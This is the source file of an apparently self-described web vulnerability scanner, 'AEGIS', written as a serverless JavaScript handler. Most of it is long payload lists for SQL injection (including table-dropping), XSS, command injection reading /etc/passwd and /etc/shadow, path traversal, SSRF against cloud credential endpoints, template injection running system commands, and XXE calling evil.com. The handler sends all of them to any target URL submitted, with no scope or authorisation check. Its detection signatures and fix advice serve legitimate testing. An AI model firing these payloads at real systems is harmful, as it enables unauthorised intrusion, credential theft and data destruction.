// ============================================
// AEGIS COMPREHENSIVE SECURITY SCANNER
// Full-depth vulnerability testing
// ============================================

// Extended SQL Injection payloads (25+ payloads)
const SQL_PAYLOADS = [
  // Basic authentication bypass
  "' OR '1'='1",
  "' OR '1'='1' --",
  "' OR '1'='1' /*",
  "1' OR '1'='1",
  "admin'--",
  "' OR 1=1--",
  "' OR 1=1#",
  "') OR ('1'='1",
  "') OR ('1'='1'--",
  // Union-based
  "' UNION SELECT NULL--",
  "' UNION SELECT NULL,NULL--",
  "' UNION SELECT NULL,NULL,NULL--",
  "1' UNION SELECT username,password FROM users--",
  "' UNION ALL SELECT 1,2,3--",
  // Error-based
  "' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--",
  "' AND extractvalue(1,concat(0x7e,(SELECT version())))--",
  "' AND updatexml(1,concat(0x7e,(SELECT version())),1)--",
  // Time-based blind
  "' AND SLEEP(5)--",
  "'; WAITFOR DELAY '0:0:5'--",
  "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
  // Stacked queries
  "'; DROP TABLE users--",
  "'; INSERT INTO users VALUES('hacked','hacked')--",
  // Double encoding
  "%27%20OR%20%271%27%3D%271",
  "&#x27;&#x20;OR&#x20;&#x27;1&#x27;&#x3D;&#x27;1",
];

// Extended XSS payloads (30+ payloads)
const XSS_PAYLOADS = [
  // Basic script injection
  "<script>alert('XSS')</script>",
  "<script>alert(document.domain)</script>",
  "<script>alert(document.cookie)</script>",
  // Event handlers
  "<img src=x onerror=alert('XSS')>",
  "<img src=x onerror=alert(1)>",
  "<svg onload=alert('XSS')>",
  "<svg/onload=alert('XSS')>",
  "<body onload=alert('XSS')>",
  "<input onfocus=alert('XSS') autofocus>",
  "<marquee onstart=alert('XSS')>",
  "<video><source onerror=alert('XSS')>",
  "<audio src=x onerror=alert('XSS')>",
  "<details open ontoggle=alert('XSS')>",
  // Breaking out of attributes
  "'><script>alert('XSS')</script>",
  "\"><script>alert('XSS')</script>",
  "' onmouseover='alert(1)'",
  "\" onmouseover=\"alert(1)\"",
  // JavaScript protocol
  "javascript:alert('XSS')",
  "javascript:alert(document.domain)",
  // Data URI
  "<a href=\"data:text/html,<script>alert('XSS')</script>\">click</a>",
  // Encoded payloads
  "<script>alert(String.fromCharCode(88,83,83))</script>",
  "<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>",
  // Filter bypass
  "<scr<script>ipt>alert('XSS')</scr</script>ipt>",
  "<SCRIPT>alert('XSS')</SCRIPT>",
  "<ScRiPt>alert('XSS')</ScRiPt>",
  "<<script>script>alert('XSS')<</script>/script>",
  // DOM-based
  "<img src=1 href=1 onerror=\"javascript:alert('XSS')\">",
  "<iframe src=\"javascript:alert('XSS')\">",
  // Template literals
  "${alert('XSS')}",
  "{{constructor.constructor('alert(1)')()}}",
];

// Extended Command Injection payloads (20+ payloads)
const CMD_PAYLOADS = [
  // Unix commands
  "; ls -la",
  "| ls -la",
  "& ls -la",
  "&& ls -la",
  "; cat /etc/passwd",
  "| cat /etc/passwd",
  "; cat /etc/shadow",
  "; whoami",
  "| whoami",
  "&& whoami",
  "; id",
  "| id",
  "; uname -a",
  "| uname -a",
  "; pwd",
  // Windows commands
  "& dir",
  "| dir",
  "& type C:\\Windows\\System32\\drivers\\etc\\hosts",
  "| net user",
  "& whoami",
  // Backtick execution
  "`ls -la`",
  "`cat /etc/passwd`",
  "`whoami`",
  // $() execution
  "$(ls -la)",
  "$(cat /etc/passwd)",
  "$(whoami)",
  // Newline injection
  "%0als -la",
  "%0acat /etc/passwd",
  "\nls -la",
  "\nwhoami",
];

// Extended Path Traversal payloads (25+ payloads)
const PATH_PAYLOADS = [
  // Basic traversal
  "../../../etc/passwd",
  "../../../../etc/passwd",
  "../../../../../etc/passwd",
  "../../../../../../etc/passwd",
  "../../../../../../../etc/passwd",
  // Double encoding
  "..%2f..%2f..%2fetc%2fpasswd",
  "..%252f..%252f..%252fetc%252fpasswd",
  "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
  // Null byte injection
  "../../../etc/passwd%00",
  "../../../etc/passwd%00.jpg",
  "../../../etc/passwd\x00",
  // Filter bypass
  "....//....//....//etc/passwd",
  "..../..../..../etc/passwd",
  "..\\..\\..\\etc\\passwd",
  "..%5c..%5c..%5cetc%5cpasswd",
  // Absolute paths
  "/etc/passwd",
  "/etc/shadow",
  "/etc/hosts",
  "/proc/self/environ",
  "/var/log/apache2/access.log",
  // Windows paths
  "..\\..\\..\\windows\\system32\\config\\sam",
  "C:\\Windows\\System32\\drivers\\etc\\hosts",
  "..\\..\\..\\..\\..\\..\\windows\\win.ini",
  // URL encoding variations
  "%2e%2e%5c%2e%2e%5c%2e%2e%5cetc%5cpasswd",
  "..%c0%af..%c0%af..%c0%afetc/passwd",
];

// Extended SSRF payloads (20+ payloads)
const SSRF_PAYLOADS = [
  // Localhost variations
  "http://localhost",
  "http://localhost:80",
  "http://localhost:443",
  "http://localhost:8080",
  "http://127.0.0.1",
  "http://127.0.0.1:80",
  "http://127.0.0.1:8080",
  "http://[::1]",
  "http://0.0.0.0",
  "http://0",
  // Cloud metadata endpoints
  "http://169.254.169.254/latest/meta-data/",
  "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
  "http://169.254.169.254/latest/user-data/",
  "http://metadata.google.internal/computeMetadata/v1/",
  "http://metadata.google.internal/computeMetadata/v1/instance/",
  "http://100.100.100.200/latest/meta-data/",
  // Internal network scanning
  "http://192.168.1.1",
  "http://192.168.0.1",
  "http://10.0.0.1",
  "http://172.16.0.1",
  // Protocol smuggling
  "file:///etc/passwd",
  "dict://localhost:11211/stats",
  "gopher://localhost:6379/_INFO",
  // Bypass techniques
  "http://127.1",
  "http://2130706433",
  "http://017700000001",
];

// Extended SSTI payloads (20+ payloads)
const SSTI_PAYLOADS = [
  // Basic math expressions
  "{{7*7}}",
  "${7*7}",
  "<%= 7*7 %>",
  "#{7*7}",
  "*{7*7}",
  "@(7*7)",
  // Jinja2 (Python)
  "{{config}}",
  "{{config.items()}}",
  "{{self.__class__.__mro__}}",
  "{{''.__class__.__mro__[2].__subclasses__()}}",
  "{{request.application.__globals__.__builtins__}}",
  // Twig (PHP)
  "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
  "{{['id']|filter('system')}}",
  // Freemarker (Java)
  "${\"freemarker.template.utility.Execute\"?new()(\"id\")}",
  "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}",
  // Velocity (Java)
  "#set($str=$class.inspect(\"java.lang.String\").type)",
  // Smarty (PHP)
  "{php}echo `id`;{/php}",
  "{system('id')}",
  // ERB (Ruby)
  "<%= system('id') %>",
  "<%= `id` %>",
  // Pebble (Java)
  "{% set cmd = 'id' %}",
];

// Extended Open Redirect payloads (20+ payloads)
const OPEN_REDIRECT_PAYLOADS = [
  // Basic redirects
  "//evil.com",
  "https://evil.com",
  "http://evil.com",
  "//evil.com/",
  // Protocol-relative
  "////evil.com",
  "/\\/evil.com",
  "/\\evil.com",
  // Encoded
  "//evil%2ecom",
  "https:%2f%2fevil.com",
  "//evil.com%2f%2f",
  // Using @ symbol
  "https://trusted.com@evil.com",
  "//trusted.com@evil.com",
  // Null byte
  "//evil.com%00.trusted.com",
  "https://evil.com%00trusted.com",
  // Tab/newline
  "//evil.com%09",
  "//evil.com%0d%0a",
  // JavaScript protocol
  "javascript:alert(document.domain)//",
  "javascript://evil.com/%0aalert(1)",
  // Data URI
  "data:text/html,<script>alert(1)</script>",
  // Mixed case
  "hTTps://evil.com",
  "HTTPS://evil.com",
];

// Extended NoSQL Injection payloads (15+ payloads)
const NOSQL_PAYLOADS = [
  // MongoDB operators
  '{"$gt": ""}',
  '{"$ne": null}',
  '{"$ne": ""}',
  '{"$gt": undefined}',
  '{"$nin": []}',
  '{"$exists": true}',
  '{"$regex": ".*"}',
  '{"$where": "1==1"}',
  // Array injection
  'username[$ne]=admin',
  'username[$gt]=',
  'password[$ne]=x',
  // JavaScript injection
  '{"$where": "this.password.match(/.*/)"}',
  '{"$where": "sleep(5000)"}',
  // Operator injection via query string
  '[$gt]=',
  '[$ne]=',
];

// XXE Injection payloads
const XXE_PAYLOADS = [
  '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
  '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/xxe">]><foo>&xxe;</foo>',
  '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://evil.com/xxe.dtd">%xxe;]>',
];

// LDAP Injection payloads
const LDAP_PAYLOADS = [
  "*",
  "*)(&",
  "*)(uid=*))(|(uid=*",
  "admin)(&)",
  "admin)(|(password=*))",
  "x)(|(objectclass=*))",
];

// CRLF Injection payloads
const CRLF_PAYLOADS = [
  "%0d%0aSet-Cookie:crlfinjection=true",
  "%0d%0aX-Injected:header",
  "\r\nSet-Cookie:crlfinjection=true",
  "%0d%0a%0d%0a<script>alert('XSS')</script>",
  "%0d%0aLocation:http://evil.com",
];

// Host Header Injection payloads
const HOST_HEADER_PAYLOADS = [
  "evil.com",
  "localhost",
  "127.0.0.1",
  "evil.com\r\nX-Injected: header",
];

// ============================================
// DETECTION SIGNATURES (Enhanced)
// ============================================

const SQL_ERROR_SIGNATURES = [
  'sql syntax', 'mysql', 'sqlite', 'postgresql', 'ORA-', 'SQL Server', 'ODBC', 
  'syntax error', 'query failed', 'database error', 'mysqli', 'pg_query', 
  'sqlite3', 'sqlstate', 'unclosed quotation', 'quoted string not properly terminated',
  'microsoft sql', 'oracle error', 'db2 sql', 'sybase', 'informix',
  'you have an error in your sql', 'supplied argument is not a valid mysql',
  'pg_exec', 'pg_connect', 'access database engine', 'jet database',
  'mysql_fetch', 'mysql_num_rows', 'mssql_query', 'odbc_exec'
];

const XSS_REFLECTION_PATTERNS = [
  /<script[^>]*>alert\(/i, 
  /onerror\s*=\s*alert\(/i, 
  /onload\s*=\s*alert\(/i,
  /onclick\s*=\s*alert\(/i,
  /onmouseover\s*=\s*alert\(/i,
  /<img[^>]+onerror/i,
  /<svg[^>]+onload/i,
  /javascript:\s*alert/i,
  /<iframe[^>]+src\s*=\s*["']?javascript/i,
];

const CMD_INJECTION_SIGNATURES = [
  'root:x:0:0', '/bin/bash', '/bin/sh', 'uid=', 'gid=', 'drwx', '-rw-',
  '/home/', '/usr/', '/var/', 'daemon:', 'nobody:', 'www-data:',
  'Linux version', 'Darwin Kernel', 'Windows NT', 'MINGW', 'CYGWIN',
  'total ', 'Directory of', 'Volume in drive', 'Volume Serial Number'
];

const PATH_TRAVERSAL_SIGNATURES = [
  'root:x:0:0', 'daemon:x:', '/bin/bash', '/bin/sh', 
  'nobody:x:', 'www-data:', '/sbin/nologin', '/usr/sbin/nologin',
  '[boot loader]', '[operating systems]', 'multi(0)', 
  '; for 16-bit app support', '[extensions]', '[mci extensions]'
];

const SSRF_SIGNATURES = [
  'ami-id', 'instance-id', 'meta-data', 'metadata', 'instance-type',
  'security-credentials', 'iam/info', 'local-hostname', 'public-hostname',
  'availability-zone', 'placement/', 'computeMetadata', 'serviceAccounts',
  'PRIVMSG', 'NICK', 'USER', '+OK', '-ERR', 'STAT', 'INFO'
];

const SSTI_SIGNATURES = ['49', '__class__', '__mro__', 'config', '__globals__', '__builtins__', 'subclasses', 'Jinja2', 'Environment'];

const NOSQL_SIGNATURES = ['MongoError', 'CastError', 'ValidationError', 'BSONTypeError', 'MongoClient', 'MongoParseError'];

const XXE_SIGNATURES = ['root:x:0:0', 'daemon:', 'SYSTEM "file:', 'ENTITY', 'DOCTYPE'];

const LDAP_SIGNATURES = ['ldap_search', 'ldap_bind', 'Invalid DN syntax', 'LDAP error'];

const CRLF_SIGNATURES = ['Set-Cookie:', 'X-Injected:', 'Location:'];

// ============================================
// TEST PARAMETERS (Comprehensive list)
// ============================================

const TEST_PARAMS = [
  // Common input params
  'id', 'user', 'username', 'login', 'email', 'password', 'pass', 'pwd',
  'q', 'query', 'search', 's', 'keyword', 'keywords', 'term',
  // URL/redirect params
  'url', 'uri', 'link', 'href', 'redirect', 'return', 'returnUrl', 'return_url',
  'next', 'goto', 'destination', 'dest', 'redir', 'redirect_uri', 'callback',
  // File params
  'file', 'filename', 'path', 'filepath', 'doc', 'document', 'folder', 'root',
  'pg', 'page', 'template', 'php_path', 'include', 'dir', 'show', 'site',
  // Data params
  'data', 'input', 'text', 'content', 'body', 'message', 'msg', 'comment',
  'name', 'title', 'description', 'value', 'val', 'param', 'arg',
  // API params
  'api', 'api_key', 'token', 'key', 'secret', 'auth', 'code', 'state',
  // Misc
  'action', 'cmd', 'command', 'exec', 'execute', 'run', 'do', 'func',
  'sort', 'order', 'orderby', 'sort_by', 'filter', 'type', 'category', 'cat',
  'lang', 'language', 'locale', 'view', 'mode', 'format', 'output',
  'debug', 'test', 'admin', 'preview', 'edit', 'delete', 'remove', 'update'
];

// ============================================
// HELPER FUNCTIONS
// ============================================

async function makeRequest(url, method = 'GET', payload = null, customHeaders = {}) {
  const controller = new AbortController();
  const timeout = setTimeout(() => controller.abort(), 15000); // Increased timeout

  try {
    const options = {
      method,
      signal: controller.signal,
      headers: {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 AEGIS-Scanner/2.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'keep-alive',
        ...customHeaders
      },
      redirect: 'manual'
    };

    if (method === 'POST' && payload) {
      options.headers['Content-Type'] = 'application/x-www-form-urlencoded';
      options.body = payload;
    }

    const response = await fetch(url, options);
    const text = await response.text();

    return {
      statusCode: response.status,
      headers: Object.fromEntries(response.headers.entries()),
      body: text,
    };
  } finally {
    clearTimeout(timeout);
  }
}

// Delay function for rate limiting
function delay(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

function injectPayloadIntoUrl(baseUrl, payload) {
  const url = new URL(baseUrl);
  const injectedUrls = [];
  
  // First, test existing parameters
  for (const [key] of url.searchParams) {
    const newUrl = new URL(baseUrl);
    newUrl.searchParams.set(key, payload);
    injectedUrls.push({ url: newUrl.toString(), param: key, type: 'existing' });
  }
  
  // Then test common vulnerability parameters
  for (const param of TEST_PARAMS) {
    if (!url.searchParams.has(param)) {
      const testUrl = new URL(baseUrl);
      testUrl.searchParams.set(param, payload);
      injectedUrls.push({ url: testUrl.toString(), param, type: 'common' });
    }
  }
  
  return injectedUrls;
}

function checkVulnerability(vulnType, response, payload) {
  const body = response.body.toLowerCase();
  const originalBody = response.body;
  
  switch (vulnType) {
    case 'SQL Injection':
      for (const sig of SQL_ERROR_SIGNATURES) {
        if (body.includes(sig.toLowerCase())) {
          return { found: true, evidence: sig, type: 'SQL Error Message' };
        }
      }
      // Check for behavior changes (potential blind SQLi indicator)
      if (response.statusCode === 500 && payload.includes("'")) {
        return { found: true, evidence: 'Server error on quote injection', type: 'Potential Blind SQLi' };
      }
      break;
      
    case 'XSS (Cross-Site Scripting)':
      // Check for direct reflection
      if (originalBody.includes(payload)) {
        return { found: true, evidence: 'Payload reflected without encoding', type: 'Reflected XSS' };
      }
      // Check for pattern matches
      for (const pattern of XSS_REFLECTION_PATTERNS) {
        if (pattern.test(originalBody)) {
          return { found: true, evidence: 'XSS pattern detected in response', type: 'Reflected XSS' };
        }
      }
      break;
      
    case 'Command Injection':
      for (const sig of CMD_INJECTION_SIGNATURES) {
        if (originalBody.includes(sig)) {
          return { found: true, evidence: sig, type: 'Command Output Detected' };
        }
      }
      break;
      
    case 'Path Traversal':
      for (const sig of PATH_TRAVERSAL_SIGNATURES) {
        if (originalBody.includes(sig)) {
          return { found: true, evidence: sig, type: 'File Content Exposed' };
        }
      }
      break;
      
    case 'SSRF (Server-Side Request Forgery)':
      for (const sig of SSRF_SIGNATURES) {
        if (body.includes(sig.toLowerCase())) {
          return { found: true, evidence: sig, type: 'Internal Resource Access' };
        }
      }
      break;
      
    case 'SSTI (Server-Side Template Injection)':
      // Check for math evaluation (7*7=49)
      if (payload.includes('7*7') && originalBody.includes('49')) {
        return { found: true, evidence: 'Template expression evaluated (49)', type: 'Template Injection Confirmed' };
      }
      for (const sig of SSTI_SIGNATURES) {
        if (originalBody.includes(sig)) {
          return { found: true, evidence: sig, type: 'Template Context Exposed' };
        }
      }
      break;
      
    case 'Open Redirect':
      if ([301, 302, 303, 307, 308].includes(response.statusCode)) {
        const location = response.headers['location'] || '';
        if (location.includes('evil.com') || location.includes('javascript:')) {
          return { found: true, evidence: `Redirects to: ${location}`, type: 'Open Redirect Confirmed' };
        }
      }
      break;
      
    case 'NoSQL Injection':
      for (const sig of NOSQL_SIGNATURES) {
        if (originalBody.includes(sig)) {
          return { found: true, evidence: sig, type: 'NoSQL Error Message' };
        }
      }
      break;
      
    case 'XXE (XML External Entity)':
      for (const sig of XXE_SIGNATURES) {
        if (originalBody.includes(sig)) {
          return { found: true, evidence: sig, type: 'XXE Response' };
        }
      }
      break;
      
    case 'LDAP Injection':
      for (const sig of LDAP_SIGNATURES) {
        if (body.includes(sig.toLowerCase())) {
          return { found: true, evidence: sig, type: 'LDAP Error' };
        }
      }
      break;
      
    case 'CRLF Injection':
      for (const sig of CRLF_SIGNATURES) {
        const headerLower = sig.toLowerCase();
        for (const [key, value] of Object.entries(response.headers)) {
          if (key.toLowerCase().includes('injected') || value.includes('crlfinjection')) {
            return { found: true, evidence: `${key}: ${value}`, type: 'Header Injection' };
          }
        }
      }
      break;
      
    case 'Host Header Injection':
      if (originalBody.includes('evil.com') || originalBody.includes(payload)) {
        return { found: true, evidence: 'Host header reflected', type: 'Host Header Injection' };
      }
      break;
  }
  
  return { found: false };
}

function getPayloads(vulnType) {
  const map = {
    'SQL Injection': SQL_PAYLOADS,
    'XSS (Cross-Site Scripting)': XSS_PAYLOADS,
    'Command Injection': CMD_PAYLOADS,
    'Path Traversal': PATH_PAYLOADS,
    'SSRF (Server-Side Request Forgery)': SSRF_PAYLOADS,
    'SSTI (Server-Side Template Injection)': SSTI_PAYLOADS,
    'Open Redirect': OPEN_REDIRECT_PAYLOADS,
    'NoSQL Injection': NOSQL_PAYLOADS,
    'XXE (XML External Entity)': XXE_PAYLOADS,
    'LDAP Injection': LDAP_PAYLOADS,
    'CRLF Injection': CRLF_PAYLOADS,
    'Host Header Injection': HOST_HEADER_PAYLOADS,
  };
  return map[vulnType] || SQL_PAYLOADS;
}

function getSeverity(vulnType) {
  const map = {
    'SQL Injection': 'Critical',
    'XSS (Cross-Site Scripting)': 'High',
    'Command Injection': 'Critical',
    'Path Traversal': 'High',
    'SSRF (Server-Side Request Forgery)': 'Critical',
    'SSTI (Server-Side Template Injection)': 'Critical',
    'Open Redirect': 'Medium',
    'NoSQL Injection': 'Critical',
    'XXE (XML External Entity)': 'Critical',
    'LDAP Injection': 'High',
    'CRLF Injection': 'Medium',
    'Host Header Injection': 'Medium',
  };
  return map[vulnType] || 'Medium';
}

function getFixSuggestion(vulnType) {
  const fixes = {
    'SQL Injection': 'Use parameterized queries (prepared statements), implement input validation, use ORM frameworks, apply least privilege database permissions, and escape special characters.',
    'XSS (Cross-Site Scripting)': 'Implement output encoding (HTML, JavaScript, URL encoding), use Content Security Policy (CSP) headers, validate and sanitize all user inputs, use HTTPOnly and Secure cookie flags.',
    'Command Injection': 'Avoid system calls with user input, use parameterized APIs, implement strict input validation with allowlists, use sandboxing and containerization.',
    'Path Traversal': 'Validate and sanitize file paths, use allowlists for permitted files, implement proper access controls, avoid user input in file operations, use chroot jails.',
    'SSRF (Server-Side Request Forgery)': 'Implement URL validation with allowlists, block internal IP ranges, disable unnecessary URL schemes, use network segmentation, implement proper firewall rules.',
    'SSTI (Server-Side Template Injection)': 'Use logic-less templates, implement sandboxing, disable dangerous template features, validate all user inputs, keep template engines updated.',
    'Open Redirect': 'Validate redirect URLs against allowlist, use relative URLs, implement redirect confirmation pages, avoid user-controlled redirect parameters.',
    'NoSQL Injection': 'Use parameterized queries, validate input types, disable JavaScript execution in queries, implement proper access controls, sanitize special characters.',
    'XXE (XML External Entity)': 'Disable external entity processing, use less complex data formats (JSON), validate XML against schema, keep XML parsers updated.',
    'LDAP Injection': 'Use parameterized LDAP queries, implement input validation, escape special LDAP characters, apply least privilege principle.',
    'CRLF Injection': 'Validate and sanitize user inputs, encode CR/LF characters, use secure HTTP libraries, implement proper header handling.',
    'Host Header Injection': 'Validate Host header against allowlist, use absolute URLs in redirects, configure web server to reject invalid hosts.',
  };
  return fixes[vulnType] || 'Implement proper input validation and security controls.';
}

// ============================================
// MAIN HANDLER
// ============================================

export const config = {
  runtime: 'edge',
  maxDuration: 60, // Allow up to 60 seconds for thorough scanning
};

export default async function handler(request) {
  // Handle CORS
  if (request.method === 'OPTIONS') {
    return new Response(null, {
      headers: {
        'Access-Control-Allow-Origin': '*',
        'Access-Control-Allow-Methods': 'POST, OPTIONS',
        'Access-Control-Allow-Headers': 'Content-Type',
      },
    });
  }

  if (request.method !== 'POST') {
    return new Response(JSON.stringify({ error: 'Method not allowed' }), {
      status: 405,
      headers: { 'Content-Type': 'application/json', 'Access-Control-Allow-Origin': '*' },
    });
  }

  try {
    const { targetUrl, vulnType } = await request.json();

    if (!targetUrl) {
      return new Response(JSON.stringify({ error: 'Target URL required' }), {
        status: 400,
        headers: { 'Content-Type': 'application/json', 'Access-Control-Allow-Origin': '*' },
      });
    }

    const results = {
      vulnerability_found: false,
      severity: 'None',
      findings: [],
      rawResponses: [],
      testedPayloads: [],
      testedParameters: [],
      totalRequests: 0,
      scanDuration: 0,
      analysis: '',
      fix_suggestion: ''
    };

    const startTime = Date.now();
    const payloads = getPayloads(vulnType);  // Use ALL payloads now
    
    console.log(`[AEGIS] Starting comprehensive scan for ${vulnType}`);
    console.log(`[AEGIS] Target: ${targetUrl}`);
    console.log(`[AEGIS] Payloads to test: ${payloads.length}`);

    // Baseline request
    let baseline;
    try {
      baseline = await makeRequest(targetUrl);
      results.totalRequests++;
      console.log(`[AEGIS] Baseline request: ${baseline.statusCode}`);
    } catch (e) {
      results.analysis = `Could not reach target: ${e.message}`;
      results.scanDuration = Date.now() - startTime;
      return new Response(JSON.stringify(results), {
        headers: { 'Content-Type': 'application/json', 'Access-Control-Allow-Origin': '*' },
      });
    }

    // Test ALL payloads
    for (let i = 0; i < payloads.length; i++) {
      const testPayload = payloads[i];
      results.testedPayloads.push(testPayload);
      
      const injectedUrls = injectPayloadIntoUrl(targetUrl, testPayload);
      
      // Test more parameters (existing + first 15 common params)
      const urlsToTest = injectedUrls.filter(u => u.type === 'existing')
        .concat(injectedUrls.filter(u => u.type === 'common').slice(0, 15));

      for (const injection of urlsToTest) {
        if (!results.testedParameters.includes(injection.param)) {
          results.testedParameters.push(injection.param);
        }
        
        try {
          // Small delay between requests to avoid rate limiting
          if (results.totalRequests > 0 && results.totalRequests % 10 === 0) {
            await delay(100);
          }
          
          const response = await makeRequest(injection.url);
          results.totalRequests++;
          
          // Store response sample (limit to prevent huge responses)
          if (results.rawResponses.length < 50) {
            results.rawResponses.push({
              payload: testPayload.substring(0, 100),
              param: injection.param,
              statusCode: response.statusCode,
              bodyLength: response.body.length,
              snippet: response.body.substring(0, 300)
            });
          }

          const check = checkVulnerability(vulnType, response, testPayload);
          
          if (check.found) {
            results.vulnerability_found = true;
            results.severity = getSeverity(vulnType);
            results.findings.push({
              payload: testPayload,
              parameter: injection.param,
              evidence: check.evidence,
              type: check.type,
              statusCode: response.statusCode,
              url: injection.url.substring(0, 200)
            });
            
            console.log(`[AEGIS] VULNERABILITY FOUND! ${check.type}`);
            
            // Continue scanning to find more vulnerabilities (don't stop early)
          }
        } catch (e) {
          // Continue on individual request errors
          console.log(`[AEGIS] Request error: ${e.message}`);
        }
      }
    }

    results.scanDuration = Date.now() - startTime;
    
    // Generate comprehensive analysis
    if (results.vulnerability_found) {
      results.analysis = `🔴 VULNERABILITIES DETECTED: ${vulnType}\n\n` +
        `Target: ${targetUrl}\n` +
        `Scan Duration: ${(results.scanDuration / 1000).toFixed(2)} seconds\n` +
        `Total Requests: ${results.totalRequests}\n` +
        `Payloads Tested: ${results.testedPayloads.length}\n` +
        `Parameters Tested: ${results.testedParameters.length}\n` +
        `Vulnerabilities Found: ${results.findings.length}\n\n` +
        `FINDINGS:\n` +
        results.findings.map((f, i) => 
          `${i + 1}. [${f.type}] Parameter: ${f.parameter}\n   Payload: ${f.payload.substring(0, 80)}\n   Evidence: ${f.evidence}`
        ).join('\n\n');
      results.fix_suggestion = getFixSuggestion(vulnType);
    } else {
      results.analysis = `✅ SCAN COMPLETE: No ${vulnType} vulnerability detected.\n\n` +
        `Target: ${targetUrl}\n` +
        `Scan Duration: ${(results.scanDuration / 1000).toFixed(2)} seconds\n` +
        `Total Requests: ${results.totalRequests}\n` +
        `Payloads Tested: ${results.testedPayloads.length}\n` +
        `Parameters Tested: ${results.testedParameters.length}\n\n` +
        `The target appears to be secure against ${vulnType} attacks based on this scan.`;
      results.fix_suggestion = 'Continue following security best practices and perform regular security assessments.';
    }

    console.log(`[AEGIS] Scan complete. Duration: ${results.scanDuration}ms, Requests: ${results.totalRequests}`);

    return new Response(JSON.stringify(results), {
      headers: { 'Content-Type': 'application/json', 'Access-Control-Allow-Origin': '*' },
    });

  } catch (error) {
    console.log(`[AEGIS] Error: ${error.message}`);
    return new Response(JSON.stringify({ error: error.message }), {
      status: 500,
      headers: { 'Content-Type': 'application/json', 'Access-Control-Allow-Origin': '*' },
    });
  }
}
